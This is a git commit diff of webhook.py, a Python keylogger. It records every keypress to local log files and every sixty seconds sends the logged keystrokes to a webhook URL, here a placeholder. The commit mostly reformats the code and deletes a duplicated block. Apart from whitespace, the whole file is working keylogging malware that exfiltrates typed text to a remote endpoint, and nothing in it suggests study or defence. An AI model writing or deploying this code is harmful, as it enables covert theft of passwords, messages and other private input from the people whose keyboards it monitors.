eafb93beb6b951928c187a9e1d41e1f29d4c7641
CH1MP5T0N <philipusadriel@gmail.com>
2023-06-10 12:12:42 +0700

    hehehehehehhe

--- webhook.py
+++ webhook.py
@@ -4,21 +4,21 @@ from threading import Timer
 import logging
 import os
 
-#variables to check the key presses
+# variables to check the key presses
 log_dir = ""
-char_count= 0
+char_count = 0
 keys = []
 
-#constants for the periodic log sending and webhook url
-WEBHOOK_URL = "your webhook url here woahahah" 
+# constants for the periodic log sending and webhook url
+WEBHOOK_URL = "insert webhook url here ahahahahaha"
 TIME_INTERVAL = 60
 
-#inputting the webhook url
+# inputting the webhook url
 log_send = Webhook(WEBHOOK_URL)
 
-#saving the file as keylogs.txt to monitor the details
+# saving the file as keylogs.txt to monitor the details
 logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
-	level=logging.DEBUG, format='%(asctime)s: %(message)s')
+                    level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 def on_press(key):
     logging.info(str(key))
@@ -34,14 +34,14 @@ def on_press(key):
             file.write(key)
             file.write("\n")
 
-    #log the key
-    #log_send.send(str(key))
+    # log the key
+    # log_send.send(str(key))
 
 def on_key_release(key):
     global keys, char_count
 
     if key == Key.esc:
-	    return False
+        return False
     else:
         if key == Key.enter:
             write_to_file(keys)
@@ -54,7 +54,7 @@ def on_key_release(key):
             char_count = 0
         keys.append(key)
         char_count += 1
-	
+
 def write_to_file(keys):
     with open("log.txt", "a") as file:
         for key in keys:
@@ -64,57 +64,18 @@ def write_to_file(keys):
         file.write("\n")
 
 def report():
+    if not os.path.exists("log.txt"):
+        open("log.txt", "w").close()  # Create an empty log.txt file if it doesn't exist
+
     if os.path.getsize("log.txt") != 0:
         with open("log.txt", "r") as file:
             keylogs = file.read()
         log_send.send(str(keylogs))
-    Timer(TIME_INTERVAL, lambda:report()).start()
+    Timer(TIME_INTERVAL, lambda: report()).start()
 
 def run():
     report()
     with Listener(on_press=on_press, on_release=on_key_release) as listener:
-	    listener.join()
-
-run()
-
-    #log the key
-    #log_send.send(str(key))
-
-def on_key_release(key):
-    global keys, char_count
-    if key == Key.esc:
-	return False
-    else:
-	if key == Key.enter:
-	     write_to_file(keys)
-	     char_count = 0
-	     keys = []
-	elif key == Key.space:
-	     key = " "
-	     write_to_file(keys)
-	     keys = []
-	     char_count = 0
-	keys.append(key)
-	char_count += 1
-	
-def write_to_file(keys):
-    with open("log.txt", "a") as file:
-	for key in keys:
-	    key = str(key).replace("'", "")
-	    if 'key'.upper() not in key.upper():
-		file.write(key)
-	file.write("\n")
-
-def report():
-    if os.path.getsize("log.txt") != 0:
-	with open("log.txt", "r") as file:
-	    keylogs = file.read()
-	log_send.send(str(keylogs))
-    Timer(TIME_INTERVAL, lambda:report()).start()
-
-def run():
-    report()
-    with Listener(on_press=on_press, on_release=on_key_release) as listener:
-	listener.join()
+        listener.join()
 
 run()
